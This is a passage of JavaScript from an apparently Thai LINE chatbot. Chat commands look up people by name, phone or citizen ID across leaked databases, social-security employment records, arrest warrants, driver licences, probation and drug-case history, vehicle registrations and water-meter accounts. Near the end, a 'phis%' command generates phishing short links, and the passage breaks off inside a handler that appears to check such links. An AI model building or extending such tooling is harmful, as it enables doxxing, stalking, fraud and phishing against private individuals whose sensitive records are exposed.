  // B-Quik CRM: bq%ชื่อ นามสกุล หรือ bq%เบอร์ หรือ bq%เลขบัตร
  if (text.startsWith('bq%')) {
    const query = text.replace(/^bq%/i, '').trim();
    if (!query) {
      return reply(event.replyToken, { type: 'text', text: "❌ กรุณาระบุคำค้น เช่น bq@0973458235 หรือ bq@วิชัย จำปา" });
    }

    try {
      const data = await fetchBQuikApi(query);
      return reply(event.replyToken, { type: 'text', text: formatBQuikResult(data, query) });
    } catch (err) {
      console.error('bquik error:', err?.response?.data || err.message);
      return reply(event.replyToken, { 
  type: 'text', 
  text: "กรุณาสืบค้นใหม่อีกครั้ง"
});
    }
  }

  // LeakOSINT: uf%คำค้นหา
  if (text.startsWith('uf%')) {
    const rawQuery = text.replace(/^uf%/i, '').trim();
    const pageMatch = rawQuery.match(/\s+(\d+)$/);
    const page = pageMatch ? Math.max(1, Number(pageMatch[1])) : 1;
    const query = pageMatch ? rawQuery.slice(0, pageMatch.index).trim() : rawQuery;
    if (!query) {
      return reply(event.replyToken, {
        type: 'text',
        text: "❌ กรุณาระบุข้อมูลที่ต้องการค้นหา เช่น uf@example@gmail.com หรือ uf@example@gmail.com 2"
      });
    }

    try {
      const result = await fetchLeakOsintApi(query);
      return reply(event.replyToken, {
        type: 'text',
        text: formatLeakOsintResult(result, query, page)
      });
    } catch (err) {
      console.error('uf lookup error:', err?.response?.data || err.message);
      return reply(event.replyToken, {
        type: 'text',
        text: '❌ ค้นหา LeakOSINT ไม่สำเร็จ กรุณาลองใหม่อีกครั้ง'
      });
    }
  }

  // ตรวจสอบแพทยสภา: dc%ชื่อ สกุล
  if (text.startsWith('dc%')) {
    const query = text.replace(/^dc%/i, '').trim();
    const parts = query.split(/\s+/).filter(Boolean);

    if (parts.length < 2) {
      return reply(event.replyToken, { type: 'text', text: "❌ กรุณาระบุชื่อและนามสกุล เช่น dc@ภัทรักษ์ ลาภบุญเรือง" });
    }

    const firstName = parts[0];
    const lastName = parts.slice(1).join(' ');

    try {
      const result = await searchCheckMd(firstName, lastName);
      return reply(event.replyToken, { type: 'text', text: formatCheckMdResult(result, query) });
    } catch (err) {
      console.error('checkmd error:', err?.response?.data || err.message);
      return reply(event.replyToken, { type: 'text', text: '❌ ตรวจสอบแพทยสภาไม่สำเร็จ: ' + err.message });
    }
  }

  if (text.startsWith('dr%')) {
    const query = text.replace(/^dr%/i, '').trim();
    const parts = query.split(/\s+/).filter(Boolean);

    if (parts.length < 2) {
      return reply(event.replyToken, { type: 'text', text: "❌ กรุณาระบุชื่อและนามสกุล เช่น dr@ภัทรักษ์ ลาภบุญเรือง" });
    }

    try {
      const result = await searchCheckMd(parts[0], parts.slice(1).join(' '));
      return reply(event.replyToken, { type: 'text', text: formatCheckMdResult(result, query) });
    } catch (err) {
      console.error('dr checkmd error:', err?.response?.data || err.message);
      return reply(event.replyToken, { type: 'text', text: '❌ ตรวจสอบแพทย์ไม่สำเร็จ: ' + err.message });
    }
  }

  // นักเรียน OPEC: st%เลขบัตร
  if (text.startsWith('st%')) {
    const citizenId = text.replace(/^st%/i, '').trim();
    if (!/^\d{13}$/.test(citizenId)) {
      return reply(event.replyToken, { type: 'text', text: "❌ กรุณาระบุเลขบัตรประชาชน 13 หลัก เช่น st@1409904942425" });
    }

    try {
      const res = await fetchOpecStudentApi(citizenId);
      return reply(event.replyToken, {
        type: 'text',
        text: formatOpecStudentResult(res, citizenId)
      });
    } catch (err) {
      console.error('opec student error:', err?.response?.data || err.message);
      return reply(event.replyToken, { type: 'text', text: '❌ ไม่พบข้อมูล' });
    }
  }

  /// =====================================
// ประกันสังคม : si%เลขบัตร
// =====================================
if (text.startsWith('si%')) {

  const registeredPhone =
    String(
      member?.phone ||
      member?.tel ||
      member?.mobile ||
      ''
    )
      .replace(/\D/g, '');


  const isSiBlocked =
    db.siBlocked?.[
      registeredPhone
    ] === true;


  // =====================================
  // สมาชิกถูกระงับคำสั่ง si%
  // =====================================
  if (isSiBlocked) {

    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
`ระบบทำการปรับปรุง⚠️
ขออภัยในความไม่สะดวก`
      }
    );
  }
    const ssoNum = text.replace(/^si%/, '').trim();
    if (!ssoNum) return reply(event.replyToken, { type: 'text', text: "❌ กรุณาระบุเลข 13 หลัก เช่น si@1234567890123" });
    try {
      const doGet = async (base) => {
        const { data } = await axios.get(
          `${base}?si=${encodeURIComponent(ssoNum)}&key=${encodeURIComponent(SEARCH_API_KEY)}`,
          {
            timeout: 30000,
            headers: {
              Accept: 'application/json, text/plain, */*',
              'Accept-Language': 'th-TH,th;q=0.9,en;q=0.8',
              'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'
            }
          }
        );
        return data;
      };

      let res;
      try {
        res = await doGet(SECURE_SEARCH_API_BASE);
      } catch (err) {
        console.error('si% หลักล่ม ใช้สำรอง:', err?.response?.data || err.message);
        res = await doGet(DXC_BACKUP_API_BASE);
      }
      if (!res.success) {
        return reply(event.replyToken, {
          type: 'text',
          text: "ไม่พบข้อมูลประกันสังคม"
        });
      }
      const data = res.data;

if (data.content && data.content.length > 0) {

  let result =
  `: ${ssoNum}\n` +
  `✅ พบข้อมูล : ${data.content.length} รายการ\n\n` +
  `────────────
`;

const numberEmoji = [
  "1.", "2.", "3.", "4.", "5.",
  "6.", "7.", "8.", "9.", '🔟'
];

const displayItems = data.content.slice(0, 10);

displayItems.forEach((item, idx) => {
  const number = numberEmoji[idx] || `${idx + 1}️⃣`;

  const status =
    item.employStatusDesc ||
    '-';

  const statusIcon =
    String(status).trim().toUpperCase() === 'ACTIVE'
      ? '🟢'
      : '🔴';

  result +=
    `\n${number}\n` +
    `• บริษัท: ${item.companyName || item.company || '-'}\n` +
    `◇ รหัสประจำสาขา
  ${item.accBran || item.branchCode || '-'}\n` +
    `• ${statusIcon} สถานะ: ${status}\n` +
    `◇ วันเริ่มทำงาน
  ${item.expStartDateText || '-'}\n` +
    `◇ วันสิ้นสุดที่ระบุ
  ${item.empResignDateText || '-'}\n`;
});

  return reply(event.replyToken, {
    type: 'text',
    text: result
  });

} else {

  return reply(event.replyToken, {
    type: 'text',
    text: 'ไม่พบข้อมูลประวัติการทำงานประกันสังคม'
  });

}
    } catch (err) {
      const responseData = err?.response?.data;
      const reason = responseData
        ? (typeof responseData === 'string' ? responseData : JSON.stringify(responseData, null, 2))
        : (err?.message || String(err));
      const status = err?.response?.status ? `HTTP ${err.response.status}: ` : '';
      console.error('si lookup error:', responseData || err.message);
      return reply(event.replyToken, {
        type: 'text',
        text: `❌ER ระบบปรับปรุงชั่วคราว:\n${status}${reason.slice(0, 4500)}`
      });
    }
  }

  // หมายศาล: doc#เลขบัตร [หน้า]
if (text.startsWith('doc#')) {
  const payload = text.replace(/^doc#/, '').trim();
  const parts = payload.split(/\s+/);

  const accCardId = parts[0];
  let page = parts[1] ? parseInt(parts[1]) - 1 : 0;

  if (!accCardId) {
    return reply(event.replyToken, {
      type: 'text',
      text: "❌ กรุณาระบุเลขบัตรประชาชน เช่น doc@1234567890123"
    });
  }

  try {
    const res = await fetchSearchApiRaw(
      { doc: accCardId },
      SECURE_SEARCH_API_BASE
    );

    if (!res.success) {
      return reply(event.replyToken, {
        type: 'text',
        text: `❌ ${res.message || '❌ER ระบบปรับปรุงชั่วคราว'}`
      });
    }

    const data = res.data;

    if (data.content && data.content.length > 0) {
      const itemsPerPage = 3;
      const totalPages = Math.ceil(
        data.content.length / itemsPerPage
      );

      if (isNaN(page) || page < 0) {
        page = 0;
      }

      if (page >= totalPages) {
        return reply(event.replyToken, {
          type: 'text',
          text: `ไม่พบข้อมูลหน้าที่ ${page + 1} (มีทั้งหมด ${totalPages} หน้า)`
        });
      }

      const startIndex = page * itemsPerPage;

      const pageItems = data.content.slice(
        startIndex,
        Math.min(
          startIndex + itemsPerPage,
          data.content.length
        )
      );

      // แปลงวันที่เป็น DD/MM/YYYY ค.ศ.
      const formatDate = (value) => {
        if (!value) return '-';

        const date = new Date(value);

        if (isNaN(date.getTime())) {
          return '-';
        }

        return date.toLocaleDateString('en-GB', {
          timeZone: 'Asia/Bangkok',
          day: '2-digit',
          month: '2-digit',
          year: 'numeric'
        });
      };

      // เลขลำดับแบบ emoji
      const numberIcons = [
        "1.",
        "2.",
        "3.",
        "4.",
        "5.",
        "6.",
        "7.",
        "8.",
        "9.",
        '🔟'
      ];

      const bubbles = pageItems.map((warrant, idx) => {
  const itemNo = startIndex + idx + 1;

  const warrantNo =
    `${warrant.woaNo || '-'}/${warrant.woaYear || '-'}`;

  const fullName =
    warrant.accFullName ||
    warrant.fullName ||
    warrant.name ||
    '-';

  const occupation =
    warrant.accOccupation ||
    warrant.occupation ||
    '-';

  const district =
    warrant.accDistrictText ||
    warrant.districtText ||
    warrant.district ||
    '-';

  const copyText =
    ` ผลการตรวจสอบหมายจับศาล
` +
    `ID: ${accCardId}\n` +
    `หมายจับที่ ${warrantNo}\n\n` +

    `ชื่อ: ${fullName}\n` +
    `อาชีพ: ${occupation}\n` +
    `อำเภอ: ${district}\n\n` +

    `ข้อมูลคดี\n` +
    `ข้อหา: ${warrant.charge || '-'}\n` +
    `ศาล: ${warrant.courtCodeText || '-'}\n` +
    `ประเภทคดี: ${warrant.faultTypeIdText || '-'}\n` +
    `วันที่ออกหมาย: ${formatDate(warrant.woaDate)}\n` +
    `สิ้นสุดอายุความ: ${formatDate(warrant.woaEndDate)}\n` +
    `สถานะ: ${warrant.arrestStatus || '-'}\n\n` +

    `ข้อมูลผู้เกี่ยวข้อง\n` +
    `ผู้พิพากษา: ${warrant.judgeName || '-'}\n` +
    `โจทก์: ${warrant.plaintiff || '-'}`;

  return {
    type: 'bubble',
    size: 'mega',

    header: {
      type: 'box',
      layout: 'vertical',
      backgroundColor: '#7F1D1D',
      paddingAll: '18px',

      contents: [
        {
          type: 'text',
          text: ` หมายจับที่ ${warrantNo}`,
          color: '#FFFFFF',
          weight: 'bold',
          size: 'lg',
          wrap: true
        },
        {
          type: 'text',
          text: `รายการ ${itemNo} จาก ${data.content.length}`,
          color: '#FECACA',
          size: 'sm',
          margin: 'sm'
        }
      ]
    },

    body: {
      type: 'box',
      layout: 'vertical',
      paddingAll: '18px',
      spacing: 'md',

      contents: [
        {
          type: 'text',
          text: " ▸ รายละเอียดของบุคคล",
          weight: 'bold',
          size: 'md',
          color: '#0F172A'
        },

        {
          type: 'text',
          text:
            `◇ ชื่อที่ระบุ
  ${fullName}\n` +
            `อาชีพ: ${occupation}\n` +
            `อำเภอ: ${district}`,
          wrap: true,
          size: 'sm',
          color: '#334155'
        },

        {
          type: 'separator',
          margin: 'md'
        },

        {
          type: 'text',
          text: " ข้อมูลคดี",
          weight: 'bold',
          size: 'md',
          color: '#0F172A',
          margin: 'md'
        },

        {
          type: 'text',
          text:
            `◇ รายการข้อหา
  ${warrant.charge || '-'}\n` +
            `ศาล: ${warrant.courtCodeText || '-'}\n` +
            `ประเภทคดี: ${warrant.faultTypeIdText || '-'}\n` +
            `วันที่ออกหมาย: ${formatDate(warrant.woaDate)}\n` +
            `สิ้นสุดอายุความ: ${formatDate(warrant.woaEndDate)}\n` +
            `สถานะ: ${warrant.arrestStatus || '-'}`,
          wrap: true,
          size: 'sm',
          color: '#334155'
        },

        {
          type: 'separator',
          margin: 'md'
        },

        {
          type: 'text',
          text: " ข้อมูลผู้เกี่ยวข้อง",
          weight: 'bold',
          size: 'md',
          color: '#0F172A',
          margin: 'md'
        },

        {
          type: 'text',
          text:
            `ผู้พิพากษา: ${warrant.judgeName || '-'}\n` +
            `โจทก์: ${warrant.plaintiff || '-'}`,
          wrap: true,
          size: 'sm',
          color: '#334155'
        }
      ]
    },

    footer: {
      type: 'box',
      layout: 'vertical',
      paddingAll: '16px',
      contents: [
        {
          type: 'button',
          style: 'primary',
          height: 'sm',
          color: '#7F1D1D',

          action: {
            type: 'clipboard',
            label: 'คัดลอกข้อมูล',
            clipboardText: copyText
          }
        }
      ]
    }
  };
});

const messages = [
  {
    type: 'flex',
    altText: `ผลการตรวจสอบหมายจับศาล ${page + 1}/${totalPages}`,
    contents: {
      type: 'carousel',
      contents: bubbles
    }
  }
];

if (totalPages > 1) {
  messages.push({
    type: 'text',
    text:
      ` หน้า ${page + 1}/${totalPages}\n` +
      `พบทั้งหมด ${data.content.length} รายการ\n` +
      `พิมพ์ doc@${accCardId} [1-${totalPages}] เพื่อดูหน้าอื่น`
  });
}

return reply(event.replyToken, messages);

    } else {
      return reply(event.replyToken, {
        type: 'text',
        text: 'ไม่พบข้อมูลหมายจับศาล'
      });
    }

  } catch (err) {
    console.log(
      'doc# error:',
      err?.response?.data || err.message
    );

    return reply(event.replyToken, {
      type: 'text',
      text: '❌ER ระบบปรับปรุงชั่วคราว'
    });
  }
}

  // ใบขับขี่: dl#เลขบัตร
if (text.startsWith('dl#')) {

  const cid = text.replace(/^dl#/, '').trim();

  if (!cid) {
    return reply(event.replyToken, {
      type: 'text',
      text: "❌กรุณาระบุเลขบัตรประชาชน เช่น dl@1234567890123"
    });
  }

  try {

    const res = await fetchSearchApiRaw(
      { dl: cid },
      SECURE_SEARCH_API_BASE
    );

    if (!res.success) {
      return reply(event.replyToken, {
        type: 'text',
        text: `❌ ${res.message || '❌ER ระบบปรับปรุงชั่วคราว'}`
      });
    }

    const data = res.data;

    if (data.content && data.content.length > 0) {

      // เลขลำดับแบบ Emoji
      const numberEmoji = [
        "1.",
        "2.",
        "3.",
        "4.",
        "5.",
        "6.",
        "7.",
        "8.",
        "9.",
        '🔟'
      ];

      // แปลงวันที่เป็น DD/MM/YYYY ค.ศ.
      const formatDate = (value) => {

        if (!value) return '-';

        const date = new Date(value);

        if (isNaN(date.getTime())) {
          return '-';
        }

        return date.toLocaleDateString('en-GB', {
          timeZone: 'Asia/Bangkok',
          day: '2-digit',
          month: '2-digit',
          year: 'numeric'
        });
      };

      // ใช้ข้อมูลบุคคลจากรายการแรก
      const firstLicense = data.content[0];

const bubbles = data.content
  .slice(0, 10)
  .map((license, idx) => {

    const issueDate = formatDate(
      license.licenseIssueDate || license.issueDate
    );

    const expirationDate = formatDate(
      license.licenseExpirationDate || license.expirationDate
    );

    const copyText =
      ` ข้อมูลใบอนุญาตขับขี่
` +
      `ID: ${license.citizenCardNumber || cid}\n` +
      `ชื่อ: ${license.fullName || '-'}\n\n` +
      `ประเภท: ${license.type || '-'}\n` +
      `เลขที่ใบอนุญาต: ${license.licenseNumber || '-'}\n` +
      `สถานะ: ${license.status || '-'}\n` +
      `สาขา: ${license.officeBranch || '-'}\n` +
      `รหัสสาขา: ${license.officeBranchCode || '-'}\n` +
      `วันที่ออก: ${issueDate}\n` +
      `วันหมดอายุ: ${expirationDate}`;

    return {
      type: 'bubble',
      size: 'mega',

      header: {
        type: 'box',
        layout: 'vertical',
        backgroundColor: '#0F172A',
        paddingAll: '18px',
        contents: [
          {
            type: 'text',
            text: ` ใบอนุญาตขับขี่ ${idx + 1}`,
            color: '#FFFFFF',
            weight: 'bold',
            size: 'lg'
          },
          {
            type: 'text',
            text: license.licenseNumber || '-',
            color: '#38BDF8',
            weight: 'bold',
            size: 'xl',
            margin: 'sm'
          }
        ]
      },

      body: {
        type: 'box',
        layout: 'vertical',
        paddingAll: '18px',
        spacing: 'md',
        contents: [
          {
            type: 'text',
            text: " ▸ รายละเอียดของบุคคล",
            weight: 'bold',
            size: 'md',
            color: '#0F172A'
          },
          {
            type: 'text',
            text:
              `ID: ${license.citizenCardNumber || cid}\n` +
              `◇ ชื่อที่ระบุ
  ${license.fullName || '-'}`,
            wrap: true,
            size: 'sm',
            color: '#334155'
          },

          {
            type: 'separator',
            margin: 'md'
          },

          {
            type: 'text',
            text: " ข้อมูลใบอนุญาต",
            weight: 'bold',
            size: 'md',
            color: '#0F172A',
            margin: 'md'
          },
          {
            type: 'text',
            text:
              `ประเภท: ${license.type || '-'}\n` +
              `เลขที่ใบอนุญาต: ${license.licenseNumber || '-'}\n` +
              `สถานะ: ${license.status || '-'}\n` +
              `◇ สาขาที่ระบุ
  ${license.officeBranch || '-'}\n` +
              `◇ รหัสประจำสาขา
  ${license.officeBranchCode || '-'}\n` +
              `วันที่ออก: ${issueDate}\n` +
              `วันหมดอายุ: ${expirationDate}`,
            wrap: true,
            size: 'sm',
            color: '#334155'
          }
        ]
      },

      footer: {
        type: 'box',
        layout: 'vertical',
        paddingAll: '16px',
        contents: [
          {
            type: 'button',
            style: 'primary',
            height: 'sm',
            color: '#0F172A',
            action: {
              type: 'clipboard',
              label: 'คัดลอกข้อมูล',
              clipboardText: copyText
            }
          }
        ]
      }
    };
  });

return reply(event.replyToken, {
  type: 'flex',
  altText: `ข้อมูลใบอนุญาตขับขี่ ${data.totalElements || data.content.length} รายการ`,
  contents: {
    type: 'carousel',
    contents: bubbles
  }
});

    } else {

      return reply(event.replyToken, {
        type: 'text',
        text: 'ไม่พบข้อมูลใบขับขี่'
      });

    }

  } catch (err) {

    console.log('dl# error:', err.message);

    return reply(event.replyToken, {
      type: 'text',
      text: '❌ER ระบบปรับปรุงชั่วคราว'
    });

  }
}

  // คุมประพฤติ: pb%เลขบัตร
  if (text.startsWith('pb%')) {
    const citizenId = text.replace(/^pb%/i, '').trim();
    if (!/^\d{13}$/.test(citizenId)) {
      return reply(event.replyToken, { type: 'text', text: "❌กรุณาระบุเลขบัตรประชาชน 13 หลัก เช่น pb@3100502131342" });
    }
    try {
      const res = await fetchPEAApiFull({ pb: citizenId }, SECURE_SEARCH_API_BASE);
      return reply(event.replyToken, { type: 'text', text: res.message || '❌ไม่พบข้อมูลคุมประพฤติ' });
    } catch (err) {
      console.error('pb error:', err?.response?.data || err.message);
      return reply(event.replyToken, { 
  type: 'text', 
  text: "กรุณาสืบค้นใหม่อีกครั้ง"
});
    }
  }

  // เช็ครถจาก CID: cid#เลขบัตร
  if (text.startsWith('cid#')) {
    const payload = text.replace(/^cid#/, '').trim();
    const parts = payload.split(/\s+/);
    const cid = parts[0];
    let page = parts[1] ? parseInt(parts[1], 10) - 1 : 0;
    if (!cid) return reply(event.replyToken, { type: 'text', text: "❌ กรุณาระบุเลขบัตรประชาชน เช่น cid@1234567890123" });
    try {
      const res = await fetchSearchApiRaw({ cid }, SECURE_SEARCH_API_BASE);
      if (!res.success) return reply(event.replyToken, { type: 'text', text: `❌ ${res.message || '❌ER ระบบปรับปรุงชั่วคราว'}` });
      const data = res.data;
      if (data.content && data.content.length > 0) {
        const itemsPerPage = 2;
        const totalPages = Math.ceil(data.content.length / itemsPerPage);
        if (isNaN(page) || page < 0) page = 0;
        if (page >= totalPages) {
          return reply(event.replyToken, { type: 'text', text: `ไม่พบข้อมูลหน้าที่ ${page + 1} (มีทั้งหมด ${totalPages} หน้า)` });
        }
        const startIndex = page * itemsPerPage;
        const pageItems = data.content.slice(startIndex, Math.min(startIndex + itemsPerPage, data.content.length));
        let result = `ข้อมูลทะเบียนรถ (จาก CID) หน้า ${page + 1}/${totalPages}
────────────
`;
        const bubbles = pageItems.map((vehicle, idx) =>
  formatVehicleDetailsFlex(
    vehicle,
    startIndex + idx + 1
  )
);

const messages = [
  {
    type: 'flex',
    altText: `ข้อมูลทะเบียนรถ พบ ${data.content.length} คัน`,
    contents: {
      type: 'carousel',
      contents: bubbles
    }
  }
];

if (totalPages > 1) {
  messages.push({
    type: 'text',
    text:
      ` พบทั้งหมด ${data.content.length} คัน\n` +
      ` หน้า ${page + 1}/${totalPages}\n` +
      `พิมพ์ cid@${cid} [1-${totalPages}] เพื่อดูหน้าอื่น`
  });
}

return reply(event.replyToken, messages);
      } else {
        return reply(event.replyToken, { type: 'text', text: 'ไม่พบข้อมูลทะเบียนรถ' });
      }
    } catch (err) {
      return reply(event.replyToken, { 
  type: 'text', 
  text: "กรุณาสืบค้นใหม่อีกครั้ง"
});
    }
  }

  // เช็ครถจากทะเบียน: car#จังหวัด หมวด ตัวเลข ประเภท [หน้า]
  if (text.startsWith('car#')) {
    const payload = text.replace(/^car#/, '').trim();
    const parts = payload.split(/\s+/);
    if (parts.length < 4) {
      return reply(event.replyToken, { type: 'text', text: "❌ รูปแบบไม่ถูกต้อง\nตัวอย่าง: car@กรุงเทพ 1กก 334 1\ncar@จังหวัด หมวดอักษร ตัวเลข ประเภทรถ" });
    }
    const province = parts[0];
    const plate1 = parts[1];
    const plate2 = parts[2];
    const vehTypeRef = parts[3];
    let page = parts[4] ? parseInt(parts[4]) - 1 : 0;
    try {
      const res = await fetchSearchApiRaw({ province, plate1, plate2, vehTypeRef }, SECURE_SEARCH_API_BASE);
      if (!res.success) return reply(event.replyToken, { type: 'text', text: `❌ ${res.message || 'ดึงข้อมูลไม่สำเร็จ'}` });
      const data = res.data;
      if (data.content && data.content.length > 0) {
        const itemsPerPage = 3;
        const totalPages = Math.ceil(data.content.length / itemsPerPage);
        if (isNaN(page) || page < 0) page = 0;
        if (page >= totalPages) return reply(event.replyToken, { type: 'text', text: `ไม่พบข้อมูลหน้าที่ ${page + 1} (มีทั้งหมด ${totalPages} หน้า)` });
        const startIndex = page * itemsPerPage;
        const pageItems = data.content.slice(startIndex, Math.min(startIndex + itemsPerPage, data.content.length));
        let result = ` ข้อมูลทะเบียนรถ (หน้า ${page + 1}/${totalPages})
────────────
`;
        const bubbles = pageItems.map((vehicle, idx) =>
  formatVehicleDetailsFlex(
    vehicle,
    startIndex + idx + 1
  )
);

const messages = [
  {
    type: 'flex',
    altText: `ข้อมูลทะเบียนรถ พบ ${data.content.length} รายการ`,
    contents: {
      type: 'carousel',
      contents: bubbles
    }
  }
];

if (totalPages > 1) {
  messages.push({
    type: 'text',
    text:
      ` พบทั้งหมด ${data.content.length} รายการ\n` +
      ` หน้า ${page + 1}/${totalPages}\n` +
      `พิมพ์ car@${province} ${plate1} ${plate2} ${vehTypeRef} [1-${totalPages}] เพื่อดูหน้าอื่น`
  });
}

return reply(event.replyToken, messages);
      } else {
        return reply(event.replyToken, { type: 'text', text: 'ไม่พบข้อมูลทะเบียนรถ' });
      }
    } catch (err) {
      return reply(event.replyToken, { 
  type: 'text', 
  text: "กรุณาสืบค้นใหม่อีกครั้ง"
});
    }
  }

  if (text.startsWith('h%')) {
  return reply(event.replyToken, {
    type: 'text',
    text:
`คำสั่ง hospital@ อยู่ระหว่างแก้ไข
ขออภัยอย่างสูงครับ`
  });
}

  if (text.startsWith('dbd%')) {
    const juristicId = text.replace(/^dbd%/i, '').trim();
    if (!/^\d{13}$/.test(juristicId)) {
      return reply(event.replyToken, {
        type: 'text',
        text: "❌กรุณาระบุเลขนิติบุคคล 13 หลัก เช่น dbd@0125538003824"
      });
    }
    try {
      const res = await fetchDxcMessageApi({ dbd: juristicId }, SECURE_SEARCH_API_BASE);
      return reply(event.replyToken, {
        type: 'text',
        text: limitLineMessage(res?.message || '❌ไม่พบข้อมูลจดทะเบียนนิติบุคคล')
      });
    } catch (err) {
      console.error('dbd% DXC error:', err?.response?.data || err.message);
      return reply(event.replyToken, {
        type: 'text',
        text: '❌ ดึงข้อมูลจดทะเบียนนิติบุคคลไม่สำเร็จ กรุณาลองใหม่อีกครั้ง'
      });
    }
  }

  if (text.startsWith('nb%')) {
    const citizenId = text.replace(/^nb%/i, '').trim();
    if (!/^\d{13}$/.test(citizenId)) {
      return reply(event.replyToken, {
        type: 'text',
        text: "❌กรุณาระบุเลขบัตรประชาชน 13 หลัก เช่น nb@1100500640987"
      });
    }
    try {
      const res = await fetchDxcMessageApi({ nb: citizenId }, SECURE_SEARCH_API_BASE);
      return reply(event.replyToken, {
        type: 'text',
        text: limitLineMessage(res?.message || '❌ไม่พบข้อมูลประวัติคดียาเสพติด')
      });
    } catch (err) {
      console.error('nb% DXC error:', err?.response?.data || err.message);
      return reply(event.replyToken, {
        type: 'text',
        text: '❌ ดึงข้อมูลประวัติคดียาเสพติดไม่สำเร็จ กรุณาลองใหม่อีกครั้ง'
      });
    }
  }

  if (text.startsWith('tic%')) {
    const trackingId = text.replace(/^tic%/, '').trim();
    if (!trackingId) {
      return reply(event.replyToken, { type: 'text', text: "❌กรุณาระบุเลขพัสดุ เช่น tic@THT123456789TH" });
    }
    const result = await trackFlashExpress(trackingId);
    return reply(event.replyToken, { type: 'text', text: result });
  }

  if (
  text
    .toLowerCase()
    .startsWith('atm%')
) {

  const keyword =
    text
      .replace(
        /^atm%/i,
        ''
      )
      .trim();


  if (!keyword) {

    return reply(
      event.replyToken,
      {
        type: 'text',

        text:
`❌ กรุณาระบุรหัสตู้ ATM

ตัวอย่าง

atm@0005

หรือระบุธนาคาร

atm@014/0005`
      }
    );
  }


  try {

    const results =
      searchAtmDatabase(
        keyword
      );


    const resultText =
      formatAtmSearchResult(
        results,
        keyword
      );


    return reply(
      event.replyToken,
      {
        type: 'text',
        text: resultText
      }
    );


  } catch (err) {

    console.error(
      'ATM SEARCH ERROR:',
      err
    );


    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
          '❌ ระบบค้นหาตู้ ATM ขัดข้อง กรุณาลองใหม่อีกครั้ง'
      }
    );
  }
}

// =========================
// PWA METERSTAT : pw%สาขา ชื่อ/ที่อยู่/หมายเลขมาตร
// =========================
if (text.toLowerCase().startsWith('pw%')) {
  const parts = text.replace(/^pw%/i, '').trim().split(/\s+/).filter(Boolean);
  const branch = parts.shift() || '';
  const value = parts.join(' ').trim();

  if (!branch || !value) {
    return reply(event.replyToken, {
      type: 'text',
      text:
`❌ กรุณาระบุสาขา และข้อมูลที่ต้องการค้นหา

ตัวอย่าง
pw@บ้านบึง นายพิเชษฐ พุฒแก้ว
pw@5531013 นายพิเชษฐ พุฒแก้ว
pw@บ้านบึง 134/2 ม.1 ต.ห้างสูง อ.หนองใหญ่ จ.ชลบุรี 20190
pw@บ้านบึง 134/2-01

ค้นหาได้ 3 แบบ
• ชื่อผู้ใช้น้ำ
• ที่อยู่ผู้ใช้น้ำ
• หมายเลขมาตรวัดน้ำ`
    });
  }

  try {
    const mode = detectPwaMeterStatMode(value);

    const { data, mode: usedMode } = await searchPwaMeterStatWithFallback({
      branch,
      value,
      mode
    });

    return reply(event.replyToken, {
      type: 'text',
      text: formatPwaMeterStatResult(data, { branch, value, mode: usedMode })
    });

  } catch (err) {
    console.error('pw% PWA meterstat error:', err?.response?.data || err.message);

    const upstreamMessage = err?.response?.data?.message;

    return reply(event.replyToken, {
      type: 'text',
      text: limitLineMessage(
        upstreamMessage
          ? `❌ ค้นหาข้อมูลมาตรวัดน้ำไม่สำเร็จ\n\n${upstreamMessage}`
          : '❌ ค้นหาข้อมูลมาตรวัดน้ำไม่สำเร็จ กรุณาลองใหม่อีกครั้ง'
      )
    });
  }
}

// =====================================
// รายชื่อสาขาประปา
// pwa%
// pwa%นครนายก
// =====================================

if (
  text
    .toLowerCase()
    .startsWith('pwa%')
) {

  const keyword =
    text
      .replace(/^pwa%/i, '')
      .trim();


  const results =
    searchPwaBranches(keyword);


  if (!results.length) {

    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
` ค้นหาสาขาการประปา

◇ ข้อมูลที่ใช้ค้นหา
  ${keyword}

❌ ไม่พบสาขาที่ค้นหา`
      }
    );
  }


  // =====================================
  // ถ้ามีคำค้น
  // =====================================

  if (keyword) {

    const list =
      results
        .map(
          (item, index) =>
            `${index + 1}. ${item.name}`
        )
        .join('\n');


    return reply(
      event.replyToken,
      {
        type: 'text',
        text:
` รายชื่อสาขาการประปา

◇ ข้อมูลที่ใช้ค้นหา
  ${keyword}
✅ พบ ${results.length}สาขาที่ระบุ

────────────

${list}`
      }
    );
  }


  // =====================================
  // ถ้าพิมพ์ pwa% เฉย ๆ
  // แบ่ง 234 สาขาเป็นหลายข้อความ
  // =====================================

  const chunkSize = 50;

  const messages = [];


  for (
    let i = 0;
    i < results.length;
    i += chunkSize
  ) {

    const group =
      results.slice(
        i,
        i + chunkSize
      );


    const list =
      group
        .map(
          (item, index) =>
            `${i + index + 1}. ${item.name}`
        )
        .join('\n');


    messages.push({
      type: 'text',

      text:
`${i === 0
  ? ` รายชื่อสาขาการประปาส่วนภูมิภาค

 ทั้งหมด ${results.length}สาขาที่ระบุ

────────────

`
  : ''
}${list}`
    });
  }


  return reply(
    event.replyToken,
    messages.slice(0, 5)
  );
}

if (text.startsWith('bn%')) {
  const keyword = text.replace(/^bn%/, '').trim();

  if (!keyword) {
    return reply(event.replyToken, {
      type: 'text',
      text: "❌ กรุณาระบุชื่อธนาคารหรือรหัสธนาคาร\nตัวอย่าง: bn@กสิกร หรือ bn@0004"
    });
  }

  try {
    const data = await searchBankBOT(keyword);
    const result = formatBankBOT(data, keyword);

    return reply(event.replyToken, {
      type: 'text',
      text: result
    });

  } catch (err) {
    console.error('bn% BOT error:', err?.response?.data || err.message);

    return reply(event.replyToken, {
      type: 'text',
      text: '❌ ไม่พบข้อมูล สืบค้นใหม่อีกครั้ง'
    });
  }
}

if (text.startsWith('#')) {

const newText = formatParcel(text);

return reply(event.replyToken, {
type: 'text',
text: newText
});

}

if (text.startsWith('@')) {

const newText = formatPhoneData(text);

return reply(event.replyToken, {
type: 'text',
text: newText
});

}

  if (text.startsWith('phis%')) {
    const targetUrl = text.replace(/^phis%/i, '').trim();
    if (!targetUrl) {
      return reply(event.replyToken, { type: 'text', text: "❌ กรุณาระบุ URL เช่น phis@https://example.com" });
    }
    const result = await createPhishingShortLink(targetUrl);
    return reply(event.replyToken, { type: 'text', text: result });
  }

  if (text.startsWith('chphis%')) {
    const id = text.replace(/^chphis%/i, '').trim();
    if (!id) {
      return reply(event.replyToken, { type: 'text', text: "❌ กรุณาระบุ ID เช่น chphis@123456" });
    }
